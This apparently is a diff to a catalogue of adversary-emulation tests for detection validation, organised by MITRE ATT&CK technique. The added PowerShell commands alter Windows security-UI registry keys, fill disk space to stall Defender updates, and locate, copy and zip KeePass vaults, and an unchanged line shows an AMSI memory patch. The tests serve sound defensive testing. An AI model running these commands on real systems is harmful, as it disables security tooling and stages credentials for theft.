+          if (Test-Path -Path $regPath) { $backup = Get-ItemProperty -Path $regPath
+          -Name "PastIconsStream" -ErrorAction SilentlyContinue; if ($null -ne $backup)
+          { Set-ItemProperty -Path $regPath -Name "T1685_PastBackup" -Value $backup.PastIconsStream
+          }; Remove-ItemProperty -Path $regPath -Name "PastIconsStream" -ErrorAction
+          SilentlyContinue; Write-Host "[+] Simulated PastIconsStream clearance executed."
+          }
+        cleanup_command: $regPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify";
+          if (Test-Path -Path $regPath) { $backup = Get-ItemProperty -Path $regPath
+          -Name "T1685_PastBackup" -ErrorAction SilentlyContinue; if ($null -ne $backup)
+          { Set-ItemProperty -Path $regPath -Name "PastIconsStream" -Value $backup.T1685_PastBackup;
+          Remove-ItemProperty -Path $regPath -Name "T1685_PastBackup" -ErrorAction
+          SilentlyContinue }; Write-Host "[+] Cleaned up PastIconsStream simulation."
+          }
+    - name: T1685.003 - Modify Action Center Quick Action Settings to Remove Security
+        Tiles
+      auto_generated_guid: a158a220-6160-4c60-bfbc-83f8687f27f8
+      description: 'Simulates adversary tampering with Action Center quick action
+        configuration to hide security management shortcuts.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\ActionCenter\Quick
+          Actions"; if (-not (Test-Path -Path $path)) { New-Item -Path $path -Force
+          | Out-Null }; Set-ItemProperty -Path $path -Name "PinnedQuickActions" -Value
+          "None" -ErrorAction SilentlyContinue; Write-Host "[+] Simulated Quick Actions
+          pinning modification executed."
+        cleanup_command: $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\ActionCenter\Quick
+          Actions"; if (Test-Path -Path $path) { Remove-ItemProperty -Path $path -Name
+          "PinnedQuickActions" -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned
+          up Quick Actions pinning settings." }
+    - name: T1685.003 - Modify Security Health UI Configuration Registry Keys
+      auto_generated_guid: 10eff45e-b16c-4049-8651-9c33fa69dd01
+      description: 'Simulates adversary modification of SecHealthUI behavior settings
+        to disrupt status reporting pipelines.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $path = "HKLM:\SOFTWARE\Microsoft\Security Health"; if (-not (Test-Path
+          -Path $path)) { New-Item -Path $path -Force | Out-Null }; Set-ItemProperty
+          -Path $path -Name "UIStateOverride" -Value 1 -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated Security Health UI override applied."
+        cleanup_command: $path = "HKLM:\SOFTWARE\Microsoft\Security Health"; if (Test-Path
+          -Path $path) { Remove-ItemProperty -Path $path -Name "UIStateOverride" -ErrorAction
+          SilentlyContinue; Write-Host "[+] Cleaned up Security Health UI override."
+          }
+    - name: T1685.003 - Modify Security Center CheckInterval to Desynchronize UI Updates
+      auto_generated_guid: 40dd86dd-f94c-4004-a953-d30eabcb61aa
+      description: 'Simulates adversary manipulation of Security Center status polling
+        frequency to delay or freeze UI status updates.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $path = "HKLM:\SOFTWARE\Microsoft\Security Center"; if (Test-Path
+          -Path $path) { Set-ItemProperty -Path $path -Name "CheckInterval" -Value
+          9999 -ErrorAction SilentlyContinue; Write-Host "[+] Simulated Security Center
+          poll interval tampering executed." }
+        cleanup_command: $path = "HKLM:\SOFTWARE\Microsoft\Security Center"; if (Test-Path
+          -Path $path) { Remove-ItemProperty -Path $path -Name "CheckInterval" -ErrorAction
+          SilentlyContinue; Write-Host "[+] Cleaned up Security Center poll interval."
+          }
   T1685.001:
     technique:
       type: attack-pattern
@@ -70050,6 +71948,95 @@ defense-impairment:
           [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect) | Out-Null
           [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
           [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect) | Out-Null
+    - name: Impair Windows Defender via Disk Space Exhaustion using fsutil
+      auto_generated_guid: '0486ee68-cfde-41a3-823f-7a0d96fa84a1'
+      description: |
+        Simulates defense impairment by leveraging the built-in Windows utility fsutil.exe to create an arbitrary oversized hidden file in the user %TEMP% directory.
+        In real-world evasion (e.g., BigDiskBuster technique), adversaries size a hidden GUID-named file to consume all available free disk space on the system drive. This condition causes Microsoft Defender Antivirus platform updates and dynamic signature downloads to fail due to disk exhaustion (ERROR_DISK_FULL / 0x80070070), freezing definition updates while keeping nominal services running.
+
+        This test creates a non-destructive temporary test file to validate detection telemetry without crashing the system drive.
+
+        References:
+        - https://lolbas-project.github.io/lolbas/Binaries/Fsutil/
+        - https://github.com/LOLBAS-Project/LOLBAS/pull/525
+        - https://www.itsc.cuhk.edu.hk/all-it/information-security/information-security-alerts/microsoft-denial-of-service-vulnerability-bigdiskbuster-cve-unknown/
+        - https://github.com/DevCop95/BDB-Guardian
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path of the temporary file to create
+          type: path
+          default: "$env:TEMP\\{15755e6b-a54d-4a6e-9773-554c724f8a63}"
+        file_size_bytes:
+          description: Size of the dummy file to allocate in bytes (defaults to 10MB
+            for safe testing)
+          type: integer
+          default: 10485760
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $targetPath = [System.IO.Path]::GetFullPath("#{file_path}")
+          $tempRoot = [System.IO.Path]::GetFullPath($env:TEMP).TrimEnd('\') + '\'
+          if (-not $targetPath.StartsWith($tempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+            throw "Refusing to create a test file outside the current user's TEMP directory: $targetPath"
+          }
+
+          $markerPath = "$targetPath.atomic-test-owner"
+          if ([System.IO.File]::Exists($targetPath) -or [System.IO.Directory]::Exists($targetPath)) {
+            throw "Refusing to overwrite an existing path: $targetPath"
+          }
+          if ([System.IO.File]::Exists($markerPath)) {
+            throw "Refusing to reuse an existing ownership marker: $markerPath"
+          }
+
+          $pendingMarker = "AtomicTest T1685 pending`n$targetPath"
+          [System.IO.File]::WriteAllText($markerPath, $pendingMarker)
+          try {
+            & fsutil.exe file createnew $targetPath #{file_size_bytes}
+            if ($LASTEXITCODE -ne 0) {
+              throw "fsutil failed with exit code $LASTEXITCODE"
+            }
+
+            [System.IO.File]::SetAttributes($targetPath, ([System.IO.File]::GetAttributes($targetPath) -bor [System.IO.FileAttributes]::Hidden))
+            $createdFile = Get-Item -LiteralPath $targetPath -Force -ErrorAction Stop
+            $ownerMarker = "AtomicTest T1685`n$targetPath`n$($createdFile.CreationTimeUtc.Ticks)`n$($createdFile.LastWriteTimeUtc.Ticks)`n$($createdFile.Length)"
+            [System.IO.File]::WriteAllText($markerPath, $ownerMarker)
+          }
+          catch {
+            if ([System.IO.File]::Exists($markerPath) -and ([System.IO.File]::ReadAllText($markerPath) -ceq $pendingMarker)) {
+              Remove-Item -LiteralPath $markerPath -Force
+            }
+            throw
+          }
+        cleanup_command: |
+          $targetPath = [System.IO.Path]::GetFullPath("#{file_path}")
+          $tempRoot = [System.IO.Path]::GetFullPath($env:TEMP).TrimEnd('\') + '\'
+          if (-not $targetPath.StartsWith($tempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+            throw "Refusing to clean a file outside the current user's TEMP directory: $targetPath"
+          }
+
+          $markerPath = "$targetPath.atomic-test-owner"
+          if ([System.IO.File]::Exists($markerPath)) {
+            $markerLines = ([System.IO.File]::ReadAllText($markerPath)) -split "`n"
+            if ($markerLines.Count -eq 5 -and $markerLines[0] -ceq 'AtomicTest T1685' -and $markerLines[1] -ceq $targetPath) {
+              if ([System.IO.File]::Exists($targetPath)) {
+                $target = Get-Item -LiteralPath $targetPath -Force -ErrorAction Stop
+                $matchesMarker = ($target.CreationTimeUtc.Ticks -eq [long]$markerLines[2]) -and
+                  ($target.LastWriteTimeUtc.Ticks -eq [long]$markerLines[3]) -and
+                  ($target.Length -eq [long]$markerLines[4])
+                if ($matchesMarker) {
+                  Remove-Item -LiteralPath $targetPath -Force -ErrorAction Stop
+                }
+                else {
+                  Write-Warning "Leaving $targetPath in place because it no longer matches the file created by this test."
+                  return
+                }
+              }
+              Remove-Item -LiteralPath $markerPath -Force -ErrorAction Stop
+            }
+          }
   T1553.004:
     technique:
       type: attack-pattern
@@ -73034,7 +75021,7 @@ credential-access:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:48:36.347Z'
-      name: Password Managers
+      name: 'Credentials from Password Stores: Password Managers'
       description: |-
         Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)
 
@@ -73057,7 +75044,170 @@ credential-access:
       - macOS
       - Windows
       x_mitre_version: '1.1'
-    atomic_tests: []
+      identifier: T1555.005
+    atomic_tests:
+    - name: KeePass Database File (.kdbx / .kdb) Discovery via PowerShell
+      auto_generated_guid: f8431722-3973-4a60-8da8-a53939b19872
+      description: |
+        Adversaries search filesystem directories (such as user documents, desktop, and temporary folders) for KeePass database files (.kdbx, .kdb) which store encrypted credentials and master databases.
+        This test simulates the discovery technique by creating a test database file with KeePass header magic bytes, scanning the target directory and %TEMP%, and outputting discovered database metadata.
+      supported_platforms:
+      - windows
+      input_arguments:
+        search_path:
+          description: Root folder to search recursively for KeePass databases
+          type: path
+          default: "$env:USERPROFILE\\Documents"
+        test_db_path:
+          description: Path to create a simulated KeePass database file
+          type: path
+          default: "$env:TEMP\\AtomicTest_Vault.kdbx"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $testDbPath = "#{test_db_path}"
+          if (-not (Test-Path -LiteralPath $testDbPath)) {
+            [IO.File]::WriteAllBytes($testDbPath, [byte[]](0x03, 0xD9, 0xA2, 0x9A, 0x67, 0xFB, 0x4B, 0xB5))
+          }
+          Write-Host "Searching for KeePass databases in #{search_path} and temp..."
+          $results = @(
+            Get-ChildItem -Path "#{search_path}" -Filter *.kdb* -Recurse -File -ErrorAction SilentlyContinue
+            Get-ChildItem -Path $env:TEMP -Filter *.kdb* -File -ErrorAction SilentlyContinue
+          ) | Where-Object { $_.Extension -in '.kdbx', '.kdb' } | Sort-Object FullName -Unique
+          $results | Select-Object FullName, Length, LastWriteTime
+        cleanup_command: 'Remove-Item -LiteralPath "#{test_db_path}" -Force -ErrorAction
+          Ignore
+
+          '
+    - name: KeePass Database File Discovery via Command Prompt
+      auto_generated_guid: 804d3fbc-5983-4fb8-9b93-3e43e827f71a
+      description: 'Adversaries use native Windows command-line utilities (dir /s
+        /b) to recursively locate .kdbx and .kdb database files across user directories
+        and temporary paths.
+
+        '
+      supported_platforms:
+      - windows
+      input_arguments:
+        search_path:
+          description: Root directory to search for KeePass databases
+          type: path
+          default: "%USERPROFILE%\\Documents"
+        test_db_path:
+          description: Path to simulated KeePass database file
+          type: path
+          default: "%TEMP%\\AtomicTest_T1555_005_Cmd\\AtomicTest_Vault.kdbx"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          if not exist "#{test_db_path}\.." mkdir "#{test_db_path}\.."
+          echo KeePassHeaderSim > "#{test_db_path}"
+          dir /s /b "#{search_path}\*.kdb*" 2>nul
+          dir /s /b "#{test_db_path}\..\*.kdb*" 2>nul
+        cleanup_command: |
+          del /f /q "#{test_db_path}" >nul 2>&1
+          rd "#{test_db_path}\.." >nul 2>&1
+    - name: KeePass Configuration and Recent Databases Discovery (KeePass.config.xml)
+      auto_generated_guid: 18306e0d-acd6-4a4d-97d9-d4cfce30103b
+      description: |
+        KeePass stores recent database file paths, user preferences, and trigger configurations in KeePass.config.xml.
+        Adversaries inspect this configuration file to locate active database paths or identify trigger execution opportunities.
+        This test creates a simulated KeePass.config.xml in a sandbox folder, reads it to parse the last used database path, and cleans up after execution.
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_config_path:
+          description: Path to create a simulated KeePass configuration XML file (use
+            a test sandbox, never a real KeePass config)
+          type: path
+          default: "$env:TEMP\\AtomicTest_T1555_005\\KeePass.config.xml"
+        mock_db_path:
+          description: Database path referenced in simulated configuration
+          type: path
+          default: C:\Users\Public\Documents\Company_Vault.kdbx
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $testConfigPath = "#{test_config_path}"
+          if ((Test-Path -LiteralPath $testConfigPath) -and ((Get-Content -LiteralPath $testConfigPath -Raw) -notmatch 'AtomicTest T1555\.005')) {
+            throw "Refusing to overwrite non-simulated KeePass config at $testConfigPath"
+          }
+          $configDir = Split-Path -Parent $testConfigPath
+          if (-not (Test-Path -LiteralPath $configDir)) { New-Item -ItemType Directory -Path $configDir -Force | Out-Null }
+          $mockConfig = @"
+          <?xml version="1.0" encoding="utf-8"?>
+          <!-- AtomicTest T1555.005 simulated configuration -->
+          <Configuration>
+            <Application>
+              <LastUsedFile>
+                <Path>#{mock_db_path}</Path>
+              </LastUsedFile>
+            </Application>
+          </Configuration>
+          "@
+          Set-Content -LiteralPath $testConfigPath -Value $mockConfig -Force
+          Write-Host "Inspecting simulated KeePass configuration file at ${testConfigPath}:"
+          [xml]$xml = Get-Content -LiteralPath $testConfigPath
+          $discoveredDb = $xml.Configuration.Application.LastUsedFile.Path
+          Write-Host "Discovered last used KeePass database: $discoveredDb"
+        cleanup_command: |
+          $testConfigPath = "#{test_config_path}"
+          if ((Test-Path -LiteralPath $testConfigPath) -and ((Get-Content -LiteralPath $testConfigPath -Raw) -match 'AtomicTest T1555\.005')) {
+            Remove-Item -LiteralPath $testConfigPath -Force -ErrorAction Ignore
+            $configDir = Split-Path -Parent $testConfigPath
+            if ((Test-Path -LiteralPath $configDir) -and (@(Get-ChildItem -LiteralPath $configDir -Force).Count -eq 0)) {
+              Remove-Item -LiteralPath $configDir -Force -ErrorAction Ignore
+            }
+          }
+    - name: Staging Discovered KeePass Databases for Exfiltration
+      auto_generated_guid: 8df395f6-3568-4b02-b1c5-fd26b25a41df
+      description: 'Simulates adversary behavior where discovered KeePass password
+        vaults are copied to a staging directory and compressed into a zip archive
+        prior to exfiltration.
+
+        '
+      supported_platforms:
+      - windows
+      input_arguments:
+        source_db:
+          description: Path to simulated KeePass database file to be staged
+          type: path
+          default: "$env:TEMP\\AtomicTest_Target.kdbx"
+        staging_dir:
+          description: Temporary directory used to stage collected password vaults
+          type: path
+          default: "$env:PUBLIC\\T1555_005_Staging"
+        archive_file:
+          description: Destination zip archive file path
+          type: path
+          default: "$env:PUBLIC\\T1555_005_Vaults.zip"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $sourceDb = "#{source_db}"
+          $stagingDir = "#{staging_dir}"
+          $archivePath = "#{archive_file}"
+          if (-not (Test-Path -LiteralPath $sourceDb)) {
+            [IO.File]::WriteAllBytes($sourceDb, [byte[]](0x03, 0xD9, 0xA2, 0x9A, 0x67, 0xFB, 0x4B, 0xB5))
+          }
+          if (-not (Test-Path -LiteralPath $stagingDir)) {
+            New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+          }
+          Copy-Item -LiteralPath $sourceDb -Destination "$stagingDir\" -Force
+          Write-Host "Staging databases to ${stagingDir}:"
+          Get-ChildItem -LiteralPath $stagingDir
+          if (Test-Path -LiteralPath $archivePath) { Remove-Item -LiteralPath $archivePath -Force }
+          Add-Type -Assembly System.IO.Compression.FileSystem
+          [IO.Compression.ZipFile]::CreateFromDirectory($stagingDir, $archivePath)
+          Write-Host "Created archive at ${archivePath}: $((Get-Item -LiteralPath $archivePath).Length) bytes"
+        cleanup_command: |
+          Remove-Item -LiteralPath "#{source_db}" -Force -ErrorAction Ignore
+          Remove-Item -LiteralPath "#{staging_dir}" -Recurse -Force -ErrorAction Ignore
+          Remove-Item -LiteralPath "#{archive_file}" -Force -ErrorAction Ignore
   T1040:
     technique:
       type: attack-pattern
